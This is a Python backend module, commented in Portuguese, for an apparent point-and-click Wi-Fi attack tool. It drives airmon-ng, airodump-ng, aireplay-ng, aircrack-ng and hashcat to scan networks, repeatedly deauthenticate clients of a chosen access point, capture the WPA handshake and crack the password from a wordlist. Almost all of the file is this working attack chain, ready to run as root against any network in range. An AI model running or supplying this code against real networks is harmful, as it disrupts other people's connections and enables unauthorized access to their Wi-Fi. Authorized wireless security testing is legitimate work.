"""Backend real: orquestra airmon-ng / airodump-ng / aireplay-ng / aircrack-ng / hashcat.

Nao reimplementa ataque nenhum — apenas chama as ferramentas padrao do aircrack-ng
e faz o parsing da saida pra alimentar a UI. Linux, exige root.
"""
from __future__ import annotations

import csv
import glob
import os
import re
import shutil
import signal
import subprocess
import tempfile
import time

from .base import Backend, CaptureState, Client, CrackState, Interface, Network


def _run(cmd, timeout=None):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        return subprocess.CompletedProcess(cmd, 1, "", str(e))


class ToolsBackend(Backend):
    demo = False

    def __init__(self):
        self.workdir = tempfile.mkdtemp(prefix="airscope-")

    # ---------- interfaces ----------
    def list_interfaces(self):
        out = []
        res = _run(["iw", "dev"])
        cur = None
        for line in res.stdout.splitlines():
            line = line.strip()
            if line.startswith("Interface "):
                cur = Interface(name=line.split()[1])
                out.append(cur)
            elif cur and line.startswith("type "):
                cur.monitor = "monitor" in line
        # driver/chipset via airmon-ng
        res = _run(["airmon-ng"])
        for line in res.stdout.splitlines():
            parts = line.split("\t") if "\t" in line else line.split()
            parts = [p for p in parts if p]
            if len(parts) >= 3 and not parts[0].upper().startswith("PHY"):
                name = parts[1] if parts[0].startswith("phy") else parts[0]
                for it in out:
                    if it.name == name:
                        it.driver = parts[-2] if len(parts) >= 2 else ""
                        it.chipset = parts[-1]
        return out

    def enable_monitor(self, iface):
        _run(["airmon-ng", "check", "kill"])
        res = _run(["airmon-ng", "start", iface.name], timeout=20)
        m = re.search(r"(?:monitor mode .*? on |\[phy\d+\])\s*(\w+)", res.stdout)
        mon = None
        # formatos comuns: "monitor mode vif enabled ... on [phy0]wlan0mon"
        m2 = re.search(r"on \[phy\d+\](\w+)", res.stdout)
        m3 = re.search(r"(\w+mon)\b", res.stdout)
        mon = (m2.group(1) if m2 else (m3.group(1) if m3 else None))
        # confere no iw
        if not mon:
            for it in self.list_interfaces():
                if it.monitor:
                    mon = it.name
                    break
        iface.mon_name = mon or (iface.name + "mon")
        iface.monitor = True
        return iface

    def disable_monitor(self, iface):
        target = iface.mon_name or iface.name
        _run(["airmon-ng", "stop", target], timeout=20)
        iface.monitor = False
        iface.mon_name = ""
        try:
            subprocess.run(["systemctl", "restart", "NetworkManager"], timeout=10)
        except Exception:
            pass
        return iface

    # ---------- scan ----------
    def scan(self, iface, on_update, stop_event):
        mon = iface.mon_name or iface.name
        prefix = os.path.join(self.workdir, "scan")
        for f in glob.glob(prefix + "*"):
            try:
                os.remove(f)
            except OSError:
                pass
        proc = subprocess.Popen(
            ["airodump-ng", "--output-format", "csv", "--write-interval", "1",
             "-w", prefix, mon],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            while not stop_event.is_set():
                nets = self._parse_scan_csv(prefix + "-01.csv")
                if nets is not None:
                    on_update(nets)
                stop_event.wait(1.0)
        finally:
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()

    def _parse_scan_csv(self, path):
        if not os.path.exists(path):
            return None
        try:
            with open(path, encoding="utf-8", errors="replace") as f:
                content = f.read()
        except OSError:
            return None
        nets = []
        # duas secoes separadas por linha em branco: APs, depois Stations
        sections = content.split("\r\n\r\n")
        ap_block = sections[0].splitlines()
        if len(ap_block) < 2:
            return nets
        reader = csv.reader(ap_block[1:])
        clients_by_bssid = {}
        if len(sections) > 1:
            for row in csv.reader(sections[1].splitlines()[1:]):
                if len(row) >= 6:
                    bssid_ap = row[5].strip()
                    clients_by_bssid[bssid_ap] = clients_by_bssid.get(bssid_ap, 0) + 1
        for row in reader:
            if len(row) < 14:
                continue
            bssid = row[0].strip()
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                continue
            try:
                ch = int(row[3].strip() or 0)
            except ValueError:
                ch = 0
            try:
                power = int(row[8].strip() or -100)
            except ValueError:
                power = -100
            priv = row[5].strip()      # WPA2, WPA, WEP, OPN...
            cipher = row[6].strip()
            auth = row[7].strip()
            try:
                beacons = int(row[9].strip() or 0)
            except ValueError:
                beacons = 0
            essid = row[13].strip()
            enc = priv.split()[0] if priv else "OPN"
            if enc == "":
                enc = "OPN"
            nets.append(Network(
                bssid=bssid, channel=ch, power=power, enc=enc, cipher=cipher, auth=auth,
                essid=essid, beacons=beacons, clients=clients_by_bssid.get(bssid, 0)))
        return nets

    # ---------- captura ----------
    def capture(self, iface, net, on_update, stop_event, deauth=True):
        mon = iface.mon_name or iface.name
        safe = re.sub(r"[^\w.-]", "_", net.essid or net.bssid.replace(":", ""))
        prefix = os.path.join(self.workdir, safe)
        for f in glob.glob(prefix + "*"):
            try:
                os.remove(f)
            except OSError:
                pass
        st = CaptureState(network=net, running=True, cap_path=prefix + "-01.cap")
        dump = subprocess.Popen(
            ["airodump-ng", "--bssid", net.bssid, "-c", str(net.channel),
             "-w", prefix, "--output-format", "pcap,csv", mon],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        deauth_proc = None
        try:
            while not stop_event.is_set():
                # clients vistos
                csvp = prefix + "-01.csv"
                st.clients = self._parse_capture_clients(csvp, net.bssid)
                # deauth periodico (broadcast ou direcionado a um client)
                if deauth and (deauth_proc is None or deauth_proc.poll() is not None):
                    cmd = ["aireplay-ng", "--deauth", "5", "-a", net.bssid]
                    if st.clients:
                        cmd += ["-c", st.clients[0].mac]
                    cmd += [mon]
                    deauth_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                                   stderr=subprocess.DEVNULL)
                    st.deauths_sent += 5
                if self._has_handshake(st.cap_path, net.bssid):
                    st.handshake = True
                    st.running = False
                    on_update(st)
                    break
                on_update(st)
                stop_event.wait(1.0)
        finally:
            for p in (deauth_proc, dump):
                if p and p.poll() is None:
                    p.send_signal(signal.SIGINT)
                    try:
                        p.wait(timeout=3)
                    except subprocess.TimeoutExpired:
                        p.kill()
        st.running = False
        return st

    def _parse_capture_clients(self, path, bssid):
        if not os.path.exists(path):
            return []
        try:
            content = open(path, encoding="utf-8", errors="replace").read()
        except OSError:
            return []
        sections = content.split("\r\n\r\n")
        if len(sections) < 2:
            return []
        out = []
        for row in csv.reader(sections[1].splitlines()[1:]):
            if len(row) >= 6 and row[5].strip() == bssid:
                mac = row[0].strip()
                try:
                    power = int(row[3].strip() or -100)
                except ValueError:
                    power = -100
                out.append(Client(mac=mac, bssid=bssid, power=power))
        return out

    def _has_handshake(self, cap_path, bssid):
        if not os.path.exists(cap_path):
            return False
        res = _run(["aircrack-ng", cap_path], timeout=15)
        txt = res.stdout
        # linhas tipo "  1  AA:BB:..  ESSID  (1 handshake)"
        for line in txt.splitlines():
            if bssid.lower() in line.lower() and "handshake" in line.lower():
                return True
        return "1 handshake" in txt.lower()

    # ---------- crack ----------
    def crack(self, cap, wordlist, on_update, stop_event):
        st = CrackState(network=cap.network, wordlist=wordlist, running=True)
        if shutil.which("hashcat") and shutil.which("hcxpcapngtool"):
            return self._crack_hashcat(cap, wordlist, st, on_update, stop_event)
        return self._crack_aircrack(cap, wordlist, st, on_update, stop_event)

    def _crack_aircrack(self, cap, wordlist, st, on_update, stop_event):
        proc = subprocess.Popen(
            ["aircrack-ng", "-w", wordlist, "-b", cap.network.bssid, cap.cap_path],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        key_re = re.compile(r"KEY FOUND!\s*\[\s*(.*?)\s*\]")
        prog_re = re.compile(r"([\d.,]+)\s*k?/s.*?(\d+)\s*/\s*(\d+)\s*keys", re.I)
        prog_re2 = re.compile(r"(\d+)\s*/\s*(\d+)\s*keys tested.*?\(\s*([\d.,]+)\s*k?/s", re.I)
        try:
            while True:
                if stop_event.is_set():
                    proc.terminate()
                    break
                line = proc.stdout.readline()
                if not line:
                    if proc.poll() is not None:
                        break
                    continue
                m = key_re.search(line)
                if m:
                    st.found = True
                    st.done = True
                    st.running = False
                    st.password = m.group(1)
                    on_update(st)
                    break
                m = prog_re2.search(line) or prog_re.search(line)
                if m:
                    try:
                        if m.re is prog_re2:
                            tried, total, rate = m.group(1), m.group(2), m.group(3)
                        else:
                            rate, tried, total = m.group(1), m.group(2), m.group(3)
                        st.tried = int(tried)
                        st.total = max(1, int(total))
                        st.progress = st.tried / st.total
                        st.speed = rate.replace(",", ".") + " k/s"
                    except (ValueError, IndexError):
                        pass
                    on_update(st)
        finally:
            if proc.poll() is None:
                proc.kill()
        if not st.found:
            st.done = True
            st.running = False
            on_update(st)
        return st

    def _crack_hashcat(self, cap, wordlist, st, on_update, stop_event):
        import json
        h22000 = os.path.join(self.workdir, "target.22000")
        _run(["hcxpcapngtool", "-o", h22000, cap.cap_path], timeout=30)
        if not os.path.exists(h22000) or os.path.getsize(h22000) == 0:
            # sem hash convertido: cai pro aircrack
            return self._crack_aircrack(cap, wordlist, st, on_update, stop_event)
        potfile = os.path.join(self.workdir, "hc.potfile")
        proc = subprocess.Popen(
            ["hashcat", "-m", "22000", "-a", "0", "--status", "--status-json",
             "--status-timer", "1", "--potfile-path", potfile, h22000, wordlist],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        try:
            while True:
                if stop_event.is_set():
                    proc.terminate()
                    break
                line = proc.stdout.readline()
                if not line:
                    if proc.poll() is not None:
                        break
                    continue
                line = line.strip()
                if not line.startswith("{"):
                    continue
                try:
                    data = json.loads(line)
                except ValueError:
                    continue
                st.progress = data.get("progress", [0, 1])[0] / max(1, data.get("progress", [0, 1])[1])
                devs = data.get("devices", [])
                if devs:
                    sp = sum(d.get("speed", 0) for d in devs)
                    st.speed = f"{sp/1000:.1f} kH/s"
                st.tried = data.get("progress", [0, 0])[0]
                st.total = data.get("progress", [0, 1])[1]
                if data.get("status") == 5 or data.get("recovered_hashes", [0])[0] > 0:
                    st.found = True
                on_update(st)
        finally:
            if proc.poll() is None:
                proc.kill()
        # le a senha do potfile (formato: hash:password)
        if os.path.exists(potfile):
            try:
                txt = open(potfile, encoding="utf-8", errors="replace").read().strip()
                if ":" in txt:
                    st.password = txt.rsplit(":", 1)[1]
                    st.found = True
            except OSError:
                pass
        st.done = True
        st.running = False
        on_update(st)
        return st

    def cleanup(self):
        try:
            shutil.rmtree(self.workdir, ignore_errors=True)
        except Exception:
            pass
